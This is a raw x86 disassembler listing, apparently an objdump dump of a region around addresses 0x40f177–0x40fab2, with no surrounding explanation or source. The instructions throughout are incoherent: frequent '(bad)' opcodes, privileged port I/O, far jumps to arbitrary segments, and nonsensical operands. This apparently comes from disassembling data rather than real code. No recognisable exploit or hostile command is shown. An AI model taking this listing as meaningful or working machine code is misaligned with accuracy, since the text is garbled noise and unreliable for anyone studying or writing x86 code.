  40f177:	test   BYTE PTR ds:0x6a0004f0,dl
  40f17d:	ds xchg edx,eax
  40f17f:	or     eax,0x6f
	...
  40f198:	add    BYTE PTR [eax],al
  40f19a:	adc    DWORD PTR [edx+0x1078e9fe],0x88fce904
  40f1a4:	call   0xe845e992
  40f1a9:	jb     0x40f1bd
  40f1ab:	add    al,0x0
  40f1ad:	gs mov bh,0x2
  40f1b0:	test   BYTE PTR [ebp+0x5c0004f7],dh
  40f1b6:	and    ebp,ecx
  40f1b8:	pop    ds
  40f1b9:	add    ch,bh
  40f1bb:	imul   edx,DWORD PTR [ebx],0xffffffc0
  40f1be:	scas   eax,DWORD PTR es:[edi]
  40f1bf:	inc    ebp
  40f1c0:	add    BYTE PTR [edx+0xb],ch
  40f1c3:	mov    dh,BYTE PTR [edx+0x59924]
  40f1c9:	add    BYTE PTR ds:0x9c498561,dh
  40f1cf:	add    eax,0x210776a
  40f1d4:	and    al,0x34
  40f1d6:	in     eax,0x60
  40f1d8:	jns    0x40f223
  40f1da:	mov    WORD PTR ds:0x5b9848d,es
  40f1e0:	add    DWORD PTR [eax],eax
  40f1e2:	popf   
  40f1e3:	pop    ebp
  40f1e4:	xchg   ebp,eax
  40f1e5:	std    
  40f1e6:	adc    ch,BYTE PTR [ebp+0xd]
  40f1e9:	mov    bh,0x49
  40f1eb:	mov    cl,0x1e
  40f1ed:	push   eax
  40f1ee:	bound  esi,QWORD PTR [ebx+eax*2]
  40f1f1:	and    al,0xfb
  40f1f3:	fmul   DWORD PTR [esi]
  40f1f5:	mov    bh,0x99
  40f1f7:	mov    cl,0x2c
  40f1f9:	push   eax
  40f1fa:	out    0xc3,al
  40f1fc:	dec    esi
  40f1fd:	lea    eax,[eax]
	...
  40f217:	fnstenv [ecx+0x55d010e]
  40f21d:	push   eax
  40f21e:	(bad)  
  40f21f:	fnstenv [ecx+0x54d00d2]
  40f225:	push   eax
  40f226:	push   0x53
  40f228:	ror    BYTE PTR [esp+edi*2+0x2fe7cd39],1
  40f22f:	mov    edi,0xc9830006
  40f234:	lea    eax,[ebx-0x75086c40]
  40f23a:	inc    ebp
  40f23b:	adc    eax,0x7dff2e6c
  40f240:	xchg   ecx,eax
  40f241:	mov    edi,eax
  40f243:	mov    ebp,0x4757fdb5
  40f248:	add    ebp,eax
  40f24a:	in     eax,0xf4
  40f24c:	repz add DWORD PTR [eax],eax
  40f24f:	js     0x40f2af
  40f251:	mulps  xmm5,XMMWORD PTR [edi-0x2f]
  40f255:	pop    es
  40f256:	cmp    ecx,ebx
  40f258:	fidiv  DWORD PTR [ecx]
  40f25a:	or     ax,0xe98
  40f25e:	dec    ebp
  40f25f:	jno    0x40f24b
  40f261:	fistp  QWORD PTR [edi]
  40f263:	and    al,0x67
  40f265:	lock fild WORD PTR [esi]
  40f268:	fiadd  WORD PTR [ebx]
  40f26a:	push   0xfffffffc
  40f26c:	add    eax,0x9e347400
  40f271:	xchg   DWORD PTR [ebx+0x30],eax
  40f274:	(bad)  
  40f275:	xor    ebp,eax
  40f277:	cwde   
  40f278:	pop    esp
  40f279:	add    al,0x0
	...
  40f293:	add    bh,al
  40f295:	fs sbb eax,0x2ca62c89
  40f29b:	lea    eax,[eax]
  40f29d:	add    bh,ah
  40f29f:	cmp    BYTE PTR [edi+ebp*1],0xac
  40f2a3:	sbb    DWORD PTR [edi+0x3484029d],esp
  40f2a9:	mov    edx,0x1e0fef8
  40f2ae:	clc    
  40f2af:	mov    WORD PTR [eax-0x3f00bff7],?
  40f2b5:	add    esp,edi
  40f2b7:	dec    edi
  40f2b8:	stos   DWORD PTR es:[edi],eax
  40f2b9:	ret    
  40f2ba:	add    al,ch
  40f2bc:	imul   esp,DWORD PTR [eax+eax*1+0x52021c00],0x4022f400
  40f2c7:	and    al,0x4
  40f2c9:	pop    edi
  40f2ca:	xor    al,0x5b
  40f2cc:	outs   dx,DWORD PTR ds:[esi]
  40f2cd:	add    DWORD PTR [ecx],edi
  40f2cf:	ret    0x9e00
  40f2d2:	das    
  40f2d3:	mov    ebx,DWORD PTR [eax]
  40f2d5:	sbb    eax,0x9df607a8
  40f2da:	add    cl,BYTE PTR [ebp-0x671efa8f]
  40f2e0:	repnz (bad) 
  40f2e2:	cmp    BYTE PTR [esp+esi*2],ch
  40f2e5:	add    al,0xe9
  40f2e7:	dec    DWORD PTR [ebp+0x5]
  40f2ea:	into   
  40f2eb:	adc    ah,ch
  40f2ed:	sbb    ch,ch
  40f2ef:	stos   DWORD PTR es:[edi],eax
  40f2f0:	ret    
  40f2f1:	enter  0x3e7,0x71
  40f2f5:	les    edi,FWORD PTR [ebx+esi*8]
	...
  40f310:	add    BYTE PTR [ebp+0x5],cl
  40f313:	pop    esp
  40f314:	add    bl,0x91
  40f317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f318:	xchg   esi,eax
  40f319:	inc    ebx
  40f31a:	nop
  40f31b:	repz dec edi
  40f31d:	add    eax,0x6380e945
  40f322:	sbb    ebp,esp
  40f324:	rcr    DWORD PTR [ebx-0x65],1
  40f327:	enter  0x896,0x1
  40f32b:	ins    BYTE PTR es:[edi],dx
  40f32c:	add    BYTE PTR [ebx+0x1b967591],0x85
  40f333:	call   0x195de73b
  40f338:	adc    BYTE PTR [esp+eax*1-0x630bd647],dh
  40f33f:	jb     0x40f300
  40f341:	hlt    
  40f342:	add    al,0x64
  40f344:	ret    
  40f345:	jmp    0xe8fc:0x35cc2879
  40f34c:	xor    BYTE PTR [edi-0x60],bh
  40f34f:	arpl   WORD PTR [eax-0x10],ax
  40f352:	xor    al,0x2e
  40f354:	adc    al,ch
  40f356:	(bad)  
  40f357:	mov    ebx,0x94c4790b
  40f35c:	aaa    
  40f35d:	ret    
  40f35e:	(bad)  
  40f35f:	fwait
  40f360:	pop    es
  40f361:	or     al,0x56
  40f363:	cld    
  40f364:	add    dh,ah
  40f366:	jnp    0x40f368
  40f368:	adc    BYTE PTR [edx],0x18
  40f36b:	stos   BYTE PTR es:[edi],al
  40f36c:	xchg   esi,eax
  40f36d:	xor    ah,0xff
  40f370:	cmc    
  40f371:	xor    DWORD PTR [esi+0xd514],ecx
	...
  40f38b:	add    BYTE PTR [eax],al
  40f38d:	add    BYTE PTR [edi],al
  40f38f:	iret   
  40f390:	jmp    FWORD PTR [ebx-0x48]
  40f393:	adc    ch,BYTE PTR [esi]
  40f395:	aaa    
  40f396:	sbb    DWORD PTR [ecx],0xf36214
  40f39c:	lea    esp,[eax+ebp*8]
  40f39f:	sbb    al,0xd0
  40f3a1:	jo     0x40f3db
  40f3a3:	add    eax,0x557cd150
  40f3a8:	add    cl,ch
  40f3aa:	je     0x40f36e
  40f3ac:	or     esp,DWORD PTR [eax+esi*4+0x10]
  40f3b0:	adc    DWORD PTR [esi-0x6eaa02fd],esp
  40f3b6:	or     al,0x2c
  40f3b8:	add    ecx,ebp
  40f3ba:	mov    BYTE PTR [ecx],bl
  40f3bc:	or     BYTE PTR [ecx-0x16ff3aee],al
  40f3c2:	leave  
  40f3c3:	xor    eax,0x5b746e8
  40f3c8:	add    BYTE PTR [esi-0xd],dh
  40f3cb:	add    bh,bh
  40f3cd:	aam    0x7b
  40f3cf:	repz aas 
  40f3d1:	jmp    0xfa0323fe
  40f3d6:	div    DWORD PTR [edi]
  40f3d8:	mov    eax,DWORD PTR [ebp+0x75]
  40f3db:	call   0x8194:0x1972b76b
  40f3e2:	mov    al,0x8d
  40f3e4:	(bad)  
  40f3e5:	jmp    0xe887a789
  40f3ea:	idiv   DWORD PTR [ecx-0x3b]
  40f3ed:	cdq    
  40f3ee:	pusha  
  40f3ef:	stc    
  40f3f0:	stos   DWORD PTR es:[edi],eax
  40f3f1:	sti    
	...
  40f40a:	add    BYTE PTR [edi-0x7c5b76fc],dh
  40f410:	mov    DWORD PTR [edi-0x555c1a],edi
  40f416:	call   0x982612
  40f41b:	mov    ch,dh
  40f41d:	scas   eax,DWORD PTR es:[edi]
  40f41e:	mov    eax,0x8b4
  40f423:	cmc    
  40f424:	jmp    0xa833:0x7d0d0146
  40f42b:	out    dx,eax
  40f42c:	inc    ecx
  40f42d:	add    BYTE PTR [ebx+0x75fed192],cl
  40f433:	leave  
  40f434:	js     0x40f40a
  40f436:	mov    esp,DWORD PTR [ebp+0x75dc7b86]
  40f43c:	sub    edi,edi
  40f43e:	(bad)  
  40f43f:	fstp   QWORD PTR [ecx+0x5b]
  40f442:	inc    edi
  40f443:	int3   
  40f444:	add    DWORD PTR [ebx+0x7377ddc7],ecx
  40f44a:	cld    
  40f44b:	pop    edx
  40f44c:	pop    edi
  40f44d:	xchg   DWORD PTR [ebp-0x73],eax
  40f450:	xchg   BYTE PTR [ebx-0x38],bh
  40f453:	inc    ebp
  40f454:	sub    eax,0x598dffff
  40f459:	inc    ebx
  40f45a:	inc    edi
  40f45b:	pushf  
  40f45c:	add    DWORD PTR [ebx+0x7377edc7],ecx
  40f462:	cld    
  40f463:	or     ah,BYTE PTR [eax+0x31]
  40f466:	not    BYTE PTR [esi]
  40f468:	push   0x39
  40f46a:	ficom  WORD PTR [ecx-0xb]
  40f46d:	cmp    BYTE PTR [ebp+0x0],dh
	...
  40f488:	int    0xfd
  40f48a:	jbe    0x40f4c7
  40f48c:	retf   
  40f48d:	std    
  40f48e:	jb     0x40f4f8
  40f490:	pop    ebp
  40f491:	std    
  40f492:	aas    
  40f493:	add    BYTE PTR [ebp+0x5d0155f1],ah
  40f499:	js     0x40f4ae
  40f49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f49c:	pop    ds
  40f49d:	inc    ecx
  40f49e:	add    BYTE PTR [ecx-0x77e9a70],cl
  40f4a4:	(bad)  
  40f4a6:	or     al,0xff
  40f4a8:	add    BYTE PTR ds:0xa3f475ff,0x32
  40f4af:	push   edi
  40f4b0:	or     al,0x8
  40f4b2:	xchg   ebp,eax
  40f4b3:	(bad)  
  40f4b4:	adc    ebx,DWORD PTR [eax]
  40f4b6:	ds clc 
  40f4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4b9:	and    BYTE PTR [esi],bh
  40f4bb:	hlt    
  40f4bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4bd:	add    DWORD PTR [ecx],0xae9ea256
  40f4c3:	test   BYTE PTR [edx+ebp*1-0x1a30cd30],dh
  40f4ca:	sbb    al,bh
  40f4cc:	push   0x3
  40f4ce:	jg     0x40f514
  40f4d0:	loopne 0x40f4fb
  40f4d2:	add    BYTE PTR [esi],al
  40f4d4:	jg     0x40f4b3
  40f4d6:	sti    
  40f4d7:	test   BYTE PTR [edx+edx*8-0x65437cf8],dh
  40f4de:	pop    ss
  40f4df:	adc    al,0x6f
  40f4e1:	popf   
  40f4e2:	int    0x44
  40f4e4:	mov    al,ds:0x21ff00ea
  40f4e9:	call   0x0:0x7491
	...
  40f504:	add    ah,ch
  40f506:	int    0x3a
  40f508:	call   0xfed3715f
  40f50d:	aaa    
  40f50e:	pop    ds
  40f50f:	retf   0xcf0b
  40f512:	call   0x13e666a2
  40f517:	sbb    esp,esi
  40f519:	jnp    0x40f50c
  40f51b:	xchg   ebx,eax
  40f51c:	(bad)  
  40f51d:	jmp    0xac558843
  40f522:	nop
  40f523:	inc    edx
  40f524:	add    bl,al
  40f526:	push   esi
  40f527:	xor    cl,cl
  40f529:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40f52b:	add    bh,BYTE PTR [edi]
  40f52d:	test   BYTE PTR [edx+edi*2-0x73],bl
  40f531:	aaa    
  40f532:	imul   DWORD PTR [edx-0x177fcc3]
  40f538:	cmp    cl,cl
  40f53a:	fmul   DWORD PTR [ecx+0x63051335]
  40f540:	xchg   cl,dl
  40f542:	jmp    0x40f59e
  40f544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f545:	push   0xffffffd4
  40f547:	inc    edx
  40f548:	dec    DWORD PTR [ecx]
  40f54a:	nop
  40f54b:	add    BYTE PTR cs:[edi+ecx*4-0x3060f857],ch
  40f553:	push   edx
  40f554:	mov    ah,cl
  40f556:	jmp    0x40f55a
  40f558:	push   edi
  40f559:	pop    ds
  40f55a:	rol    BYTE PTR [edx-0x1],1
  40f55d:	lahf   
  40f55e:	or     esi,DWORD PTR [edi+0x7]
  40f561:	pop    esi
  40f562:	mov    eax,0xd04f40ed
  40f567:	or     eax,0x83
	...
  40f580:	add    BYTE PTR [eax],al
  40f582:	sub    DWORD PTR [eax],ebp
  40f584:	cmp    esi,0x7ed8205d
  40f58a:	xchg   DWORD PTR [ebx+edx*4],ecx
  40f58d:	sub    esi,DWORD PTR [esi-0x5b]
  40f590:	sbb    eax,0x424b6098
  40f595:	or     BYTE PTR [edx+0x1dfe52a2],ah
  40f59b:	push   ebx
  40f59c:	mov    fs,edx
  40f59e:	cmp    DWORD PTR [eax],esp
  40f5a0:	enter  0xddc0,0xb7
  40f5a4:	xchg   dl,cl
  40f5a6:	sbb    eax,0x10bed6d0
  40f5ab:	dec    esp
  40f5ac:	or     bh,bh
  40f5ae:	or     eax,0x2a22bfd0
  40f5b3:	in     al,0x42
  40f5b5:	retf   
  40f5b6:	popf   
  40f5b7:	push   edx
  40f5b8:	ds loop 0x40f578
  40f5bb:	sbb    al,0xe8
  40f5bd:	xchg   edi,eax
  40f5be:	loop   0x40f56f
  40f5c0:	nop
  40f5c1:	ds into 
  40f5c3:	shr    BYTE PTR [esi],0xe2
  40f5c6:	int    0x52
  40f5c8:	fiadd  WORD PTR [edx+0x0]
  40f5cb:	into   
  40f5cc:	xchg   edx,eax
  40f5cd:	(bad)  
  40f5ce:	pop    edx
  40f5cf:	cmp    eax,DWORD PTR [eax]
  40f5d1:	addr16 push cs
  40f5d3:	test   al,0x46
  40f5d5:	pop    edi
  40f5d6:	sub    al,BYTE PTR [ebp+0x1d2a4318]
  40f5dc:	push   ebx
  40f5dd:	shl    DWORD PTR [edx],cl
  40f5df:	sbb    eax,0x3ab6ce3b
  40f5e4:	sbb    edx,DWORD PTR [ebx]
	...
  40f5fe:	add    bl,ah
  40f600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f601:	les    ebp,FWORD PTR [ebx+0x533aec04]
  40f607:	ins    DWORD PTR es:[edi],dx
  40f608:	fstp   DWORD PTR [esi]
  40f60a:	outs   dx,DWORD PTR ds:[esi]
  40f60b:	retf   0xfca5
  40f60e:	stos   DWORD PTR es:[edi],eax
  40f60f:	stos   BYTE PTR es:[edi],al
  40f610:	in     eax,dx
  40f611:	cmp    dl,BYTE PTR [ebx+0x2b6a5e70]
  40f617:	(bad)  
  40f618:	xor    eax,0x5e708339
  40f61d:	push   0x2b
  40f61f:	inc    eax
  40f620:	repnz cmp dl,BYTE PTR [ebx+0xfb61f17]
  40f627:	aad    0xd0
  40f629:	cmp    BYTE PTR [ebx+0x3dafccb9],al
  40f62f:	loope  0x40f5b7
  40f631:	dec    ebx
  40f632:	and    ebp,DWORD PTR [ecx-0x5dda7ae4]
  40f638:	sbb    al,0x3b
  40f63a:	(bad)  
  40f63b:	pop    eax
  40f63c:	call   0x3b75bcb2
  40f641:	pop    ds
  40f642:	sbb    eax,0xffffff86
  40f645:	xor    al,0xb0
  40f647:	sbb    DWORD PTR [edi+edi*4],0xb61fe503
  40f64e:	jg     0x40f6a5
  40f650:	cmp    BYTE PTR [ebx-0x44],ch
  40f653:	add    al,0x3b
  40f655:	and    esp,DWORD PTR [eax-0x67]
  40f658:	loopne 0x40f658
  40f65a:	sbb    BYTE PTR [ecx-0x32],0xb5
  40f65e:	aas    
  40f65f:	push   ebp
  40f660:	add    BYTE PTR [ebx+0x0],ch
	...
  40f67b:	add    BYTE PTR [edi],bl
  40f67d:	and    BYTE PTR [edi+0x7d6d6778],al
  40f683:	ja     0x40f646
  40f685:	(bad)  
  40f686:	imul   edi,DWORD PTR [eax-0x4019028d],0x3b67cfa3
  40f690:	(bad)  
  40f691:	xlat   BYTE PTR ds:[ebx]
  40f692:	xchg   esp,eax
  40f693:	dec    edi
  40f694:	xchg   ebx,eax
  40f695:	mov    edx,DWORD PTR [ebx+0x289f672e]
  40f69b:	cmp    esp,DWORD PTR [ecx+0x45]
  40f69e:	dec    esi
  40f69f:	xor    al,0xa6
  40f6a1:	jle    0x40f6cf
  40f6a3:	pop    ds
  40f6a4:	iret   
  40f6a5:	dec    ecx
  40f6a6:	push   0x1f41f73b
  40f6ab:	ret    0x43fd
  40f6ae:	dec    esi
  40f6af:	xor    al,0xc8
  40f6b1:	shl    BYTE PTR [eax],cl
  40f6b3:	mov    al,0x12
  40f6b5:	iret   
  40f6b6:	ret    0x5655
  40f6b9:	push   0x7f
  40f6bb:	in     al,dx
  40f6bc:	stc    
  40f6bd:	cld    
  40f6be:	(bad)  
  40f6bf:	(bad)  
  40f6c0:	jmp    0x40f68d
  40f6c2:	mov    esi,0x5ccee
  40f6c7:	push   edi
  40f6c8:	(bad)
  40f6cd:	pusha  
  40f6ce:	inc    ecx
  40f6cf:	add    BYTE PTR [edx-0x32e9b56e],al
  40f6d5:	add    BYTE PTR [ebx-0x4bf54e3c],al
  40f6db:	in     al,0x70
  40f6dd:	je     0x40f6dc
  40f6df:	call   0x40f6e4
	...
  40f6f8:	add    BYTE PTR ds:0xf7ffffe4,bh
  40f6fe:	nop
  40f6ff:	mov    eax,DWORD PTR [ebp-0x28907]
  40f705:	xchg   esp,eax
  40f706:	sbb    eax,0x6d4d43e1
  40f70b:	fdivr  DWORD PTR [edi-0x7afd630c]
  40f711:	xor    al,0xaf
  40f713:	std    
  40f714:	mov    dh,BYTE PTR [edx]
  40f716:	fld    DWORD PTR [edx]
  40f718:	add    BYTE PTR [edx+ebx*2-0x23f906eb],dh
  40f71f:	fwait
  40f720:	outs   dx,BYTE PTR ds:[esi]
  40f721:	sahf   
  40f722:	scas   eax,DWORD PTR es:[edi]
  40f723:	jge    0x40f6a9
  40f725:	mov    ds:0xc4fe8fe2,al
  40f72a:	jne    0x40f72e
  40f72c:	lea    esp,[ecx+0x13c783c7]
  40f732:	add    ecx,eax
  40f734:	mov    ds:0xbf859bf5,eax
  40f739:	sub    BYTE PTR [eax-0x7c5b3a85],0x82
  40f740:	fnsave [edi]
  40f742:	sahf   
  40f743:	jge    0x40f6c9
  40f745:	enter  0x8ea3,0xfe
  40f749:	inc    esp
  40f74a:	mov    dh,0x6c
  40f74c:	push   esp
  40f74e:	popf   
  40f74f:	xchg   DWORD PTR [edi-0x7c3beefd],edi
  40f755:	mov    ah,0xc9
  40f757:	cld    
  40f758:	xor    dh,BYTE PTR [eax+eax*2+0x847d]
	...
  40f773:	add    BYTE PTR [eax],al
  40f775:	add    BYTE PTR [eax-0x4c0171ad],bl
  40f77b:	xchg   ecx,eax
  40f77c:	push   cs
  40f77d:	fidiv  WORD PTR [edi]
  40f77f:	sahf   
  40f780:	jg     0x40f706
  40f782:	shl    BYTE PTR [ebx-0x72],0xfe
  40f786:	inc    esp
  40f787:	outs   dx,DWORD PTR ds:[esi]
  40f788:	clc    
  40f789:	lahf   
  40f78a:	out    0xdd,al
  40f78c:	add    eax,DWORD PTR [ebp-0x1c76ee4c]
  40f792:	add    DWORD PTR [edi],0x57ed738f
  40f798:	add    eax,DWORD PTR [eax]
  40f79a:	mov    ah,0xe6
  40f79c:	sbb    cl,bh
  40f79e:	pop    edi
  40f79f:	add    eax,0x8863c67f
  40f7a4:	test   al,0x3e
  40f7a6:	loope  0x40f735
  40f7a8:	cwde   
  40f7a9:	add    eax,0xc22026b3
  40f7ae:	test   DWORD PTR [esp+ebx*4],0x4c864f7a
  40f7b5:	sbb    dl,dh
  40f7b7:	add    al,0xe9
  40f7b9:	xor    cl,dl
  40f7bb:	rcl    DWORD PTR [ecx],cl
  40f7bd:	aaa    
  40f7be:	jns    0x40f7d2
  40f7c0:	xor    eax,0xe9055f4c
  40f7c5:	add    ebp,DWORD PTR [edx+ebp*1+0x16]
  40f7c9:	pushf  
  40f7ca:	push   edx
  40f7cb:	inc    ecx
  40f7cc:	call   0x990076d4
  40f7d1:	mov    gs,eax
  40f7d3:	pop    eax
  40f7d4:	fiadd  DWORD PTR [ebx-0xc]
  40f7d7:	jge    0x40f784
  40f7d9:	xchg   edi,eax
	...
  40f7f2:	add    BYTE PTR [esi],ch
  40f7f4:	(bad)  
  40f7f5:	fld    QWORD PTR [edi+0x3e90495]
  40f7fb:	jno    0x40f806
  40f7fd:	lea    ecx,[ebx-0x68]
  40f800:	add    al,0xe9
  40f802:	add    ebx,esp
  40f804:	sbb    al,0x25
  40f806:	add    eax,0x33ad7bf4
  40f80b:	ret    
  40f80c:	adc    DWORD PTR [ebp-0x25a31f72],esi
  40f812:	inc    ebx
  40f813:	hlt    
  40f814:	retf   
  40f815:	test   eax,0x337a2317
  40f81a:	mov    WORD PTR [edx+edi*2+0x6b],es
  40f81e:	arpl   WORD PTR [eax-0x44cb6a79],bx
  40f824:	inc    ecx
  40f825:	xchg   ecx,eax
  40f826:	pop    es
  40f827:	cmc    
  40f828:	add    al,0xe9
  40f82a:	mov    ?,WORD PTR [ebx+0x1048083]
  40f830:	daa    
  40f831:	add    BYTE PTR [esp+edi*2+0x6f],ah
  40f835:	cli    
  40f836:	outs   dx,BYTE PTR ds:[esi]
  40f837:	jp     0x40f870
  40f839:	push   0xffffffe8
  40f83b:	std    
  40f83c:	xchg   DWORD PTR [ecx-0x1a],ebp
  40f83f:	mov    BYTE PTR es:[ecx+esi*4],dl
  40f843:	inc    esi
  40f844:	(bad)  
  40f845:	jmp    DWORD PTR [ebx+0x37]
  40f848:	adc    BYTE PTR [esi+0x74],al
  40f84b:	ins    BYTE PTR es:[edi],dx
  40f84c:	addr16 cld 
  40f84e:	ds push 0x37
  40f851:	(bad)  
  40f852:	fcom   QWORD PTR [edi-0xb]
  40f855:	aas    
  40f856:	jmp    0x40f85b
	...
  40f86f:	add    bh,ah
  40f871:	jge    0x40f8b7
  40f873:	and    DWORD PTR [eax+eax*4-0x69],esi
  40f877:	and    ch,BYTE PTR [edx-0x7a]
  40f87a:	dec    edi
  40f87b:	fs jl  0x40f8e5
  40f87e:	cld    
  40f87f:	push   cs
  40f880:	jp     0x40f8b9
  40f882:	(bad)  
  40f883:	fdiv   QWORD PTR [edi]
  40f885:	repnz aas 
  40f887:	jmp    0xd4b53ff8
  40f88c:	outs   dx,BYTE PTR ds:[esi]
  40f88d:	inc    ecx
  40f88e:	clc    
  40f88f:	pop    esp
  40f890:	jae    0x40f8d3
  40f892:	cwde   
  40f893:	loop   0x40f906
  40f895:	xchg   DWORD PTR [edi+0x6a],ecx
  40f898:	cwde   
  40f899:	xchg   DWORD PTR [esp+ebx*4-0x310174a0],ecx
  40f8a0:	push   0xf7e8a542
  40f8a5:	mov    esi,0x85f7be44
  40f8aa:	je     0x40f869
  40f8ac:	xor    ecx,0x537dbb7
  40f8b2:	cmp    BYTE PTR [ecx+esi*2+0x11],al
  40f8b6:	pop    es
  40f8b7:	(bad)  [edi-0x8178e63]
  40f8bd:	add    al,0x88
  40f8bf:	sub    al,0x79
  40f8c1:	jge    0x40f91f
  40f8c3:	add    BYTE PTR [ebp+0x38],ah
  40f8c6:	das    
  40f8c7:	je     0x40f896
  40f8c9:	add    BYTE PTR [ebp-0x732e8abb],cl
  40f8cf:	inc    ebp
  40f8d0:	jno    0x40f8a3
  40f8d2:	mov    WORD PTR [ebp+0x0],es
	...
  40f8ed:	mov    ebp,0xc8ff69d0
  40f8f2:	cmp    eax,0x43750f8
  40f8f7:	push   ebx
  40f8f8:	push   ebx
  40f8f9:	aam    0xd5
  40f8fb:	idiv   edi
  40f8fd:	and    BYTE PTR [esi+0xb4d4011],ah
  40f903:	inc    esp
  40f904:	in     al,dx
  40f905:	lds    esi,FWORD PTR es:[edx+0xb]
  40f909:	sbb    BYTE PTR [esi+edi*8-0x1],ch
  40f90d:	or     eax,0xde48389
  40f912:	add    al,BYTE PTR [eax]
  40f914:	cmp    DWORD PTR [eax+0x7a],ecx
  40f917:	or     eax,0xeb84
  40f91c:	add    BYTE PTR [esi],bh
  40f91e:	jo     0x40f957
  40f920:	pop    ebp
  40f921:	std    
  40f922:	mov    BYTE PTR [edx+edi*4-0x72fffe23],al
  40f929:	nop
  40f92a:	ins    DWORD PTR es:[edi],dx
  40f92b:	dec    esi
  40f92c:	mov    edx,DWORD PTR [eax]
  40f92e:	jns    0x40f998
  40f930:	pop    ss
  40f931:	mov    edx,0xaa53aead
  40f936:	mov    ?,WORD PTR [edx]
  40f938:	adc    ebx,DWORD PTR ds:0xcac08501
  40f93e:	jle    0x40f8d3
  40f940:	add    ch,cl
  40f942:	add    DWORD PTR [ebx-0x3e438ebb],ecx
  40f948:	movups XMMWORD PTR [edi+edi*8],xmm1
  40f94c:	dec    DWORD PTR [ebp+0xa08c06]
	...
  40f96a:	js     0x40f9e4
  40f96c:	std    
  40f96d:	push   ecx
  40f96e:	hlt    
  40f96f:	outs   dx,BYTE PTR ds:[esi]
  40f970:	adc    dl,BYTE PTR [eax]
  40f972:	pushf  
  40f973:	or     eax,ebx
  40f975:	add    esp,esi
  40f977:	pop    ss
  40f978:	ret    
  40f979:	jae    0x40f985
  40f97b:	sbb    DWORD PTR [esi-0x73f19069],eax
  40f981:	dec    edi
  40f982:	jns    0x40f9a4
  40f984:	arpl   sp,di
  40f986:	arpl   WORD PTR [esi],bx
  40f988:	xor    edx,DWORD PTR [eax+0x4c]
  40f98b:	inc    ecx
  40f98c:	(bad)  
  40f98d:	call   DWORD PTR [ebx+0x18]
  40f990:	ret    
  40f991:	jae    0x40f935
  40f993:	sub    BYTE PTR [esi-0x73c1be61],al
  40f999:	dec    edi
  40f99a:	dec    esp
  40f99b:	cdq    
  40f99c:	in     eax,dx
  40f99d:	add    esp,esi
  40f99f:	pop    ss
  40f9a0:	ret    
  40f9a1:	jae    0x40f955
  40f9a3:	sub    BYTE PTR [esi-0x7421e271],al
  40f9a9:	dec    edi
  40f9aa:	mov    WORD PTR [ebx],ds
  40f9ac:	add    eax,DWORD PTR [eax]
  40f9ae:	clc    
  40f9af:	inc    esi
  40f9b0:	jge    0x40f936
  40f9b2:	push   esp
  40f9b3:	clc    
  40f9b4:	mov    edi,esi
  40f9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9b7:	push   0xffffff9a
  40f9b9:	outs   dx,DWORD PTR ds:[esi]
  40f9ba:	cmp    ebx,DWORD PTR [edx+eax*1-0x24fd4b7b]
  40f9c1:	push   edx
  40f9c2:	jns    0x40f9ad
  40f9c4:	jb     0x40f9be
  40f9c6:	jecxz  0x40fa33
  40f9c8:	xor    edx,DWORD PTR [ebx-0x34]
  40f9cb:	add    BYTE PTR [ecx+0xff],bh
	...
  40f9e5:	add    BYTE PTR [eax],al
  40f9e7:	shl    edx,cl
  40f9e9:	ret    
  40f9ea:	jae    0x40f9ce
  40f9ec:	loopne 0x40f96e
  40f9ee:	(bad)  
  40f9ef:	mov    ebp,0x6f4f8a4b
  40f9f4:	sub    DWORD PTR [eax-0x3fa1db02],edx
  40f9fa:	inc    esp
  40f9fb:	stos   DWORD PTR es:[edi],eax
  40f9fc:	ins    DWORD PTR es:[edi],dx
  40f9fd:	call   0x9a8b:0xa6059f23
  40fa04:	cli    
  40fa05:	xchg   esp,eax
  40fa06:	mov    ebp,eax
  40fa08:	xor    al,0xfa
  40fa0a:	inc    ebx
  40fa0b:	hlt    
  40fa0c:	retf   0x10d1
  40fa0f:	test   BYTE PTR [ebx+ebp*2],dl
  40fa12:	inc    edx
  40fa13:	jnp    0x40f999
  40fa15:	jge    0x40f9a2
  40fa17:	call   0x1c326f98
  40fa1c:	sbb    BYTE PTR [ecx],ch
  40fa1e:	add    al,0x75
  40fa20:	add    dl,BYTE PTR [ebp-0x62]
  40fa23:	pop    ebx
  40fa24:	test   al,ch
  40fa26:	cli    
  40fa27:	ja     0x40fa99
  40fa29:	push   esi
  40fa2a:	mov    ecx,DWORD PTR [edx-0x6e]
  40fa2d:	arpl   WORD PTR [esi+edi*1-0x7c],bp
  40fa31:	inc    ebp
  40fa32:	xor    al,0xce
  40fa34:	add    eax,0xb9b8ad3
  40fa39:	imul   eax,DWORD PTR [esp+esi*8],0xcbf12dd7
  40fa40:	pop    ss
  40fa41:	test   eax,0x93457103
  40fa46:	iret   
  40fa47:	or     BYTE PTR [edx+0x8d78],0x0
	...
  40fa62:	add    BYTE PTR [eax],al
  40fa64:	or     al,BYTE PTR [eax+edi*4-0x16fa8be5]
  40fa6b:	jmp    DWORD PTR [edx-0x11939c6f]
  40fa71:	xor    ebp,0x33
  40fa74:	inc    edi
  40fa75:	ins    DWORD PTR es:[edi],dx
  40fa76:	push   es
  40fa77:	dec    edx
  40fa78:	hlt    
  40fa79:	add    al,0x6c
  40fa7b:	ret    
  40fa7c:	sbb    edi,DWORD PTR [bp+si]
  40fa7f:	jns    0x40faf9
  40fa81:	xchg   esp,eax
  40fa82:	iret   
  40fa83:	mov    cl,dl
  40fa85:	aam    0x39
  40fa87:	pushf  
  40fa88:	sti    
  40fa89:	push   ecx
  40fa8a:	call   0x34856a92
  40fa8f:	add    BYTE PTR [edx-0xf4a0037],bh
  40fa95:	mov    es,WORD PTR [esi+ebp*4-0x32]
  40fa99:	loop   0x40faf5
  40fa9b:	mov    al,0xb2
  40fa9d:	fmul   DWORD PTR [edx-0x7c908773]
  40faa3:	out    0xf7,al
  40faa5:	add    al,0x53
  40faa7:	aaa    
  40faa8:	(bad)  
  40faa9:	xchg   ecx,eax
  40faaa:	mov    ah,0xe9
  40faac:	data16 cmp dh,0x91
  40fab0:	dec    esi
  40fab1:	out    dx,eax
  40fab2:	(bad)  
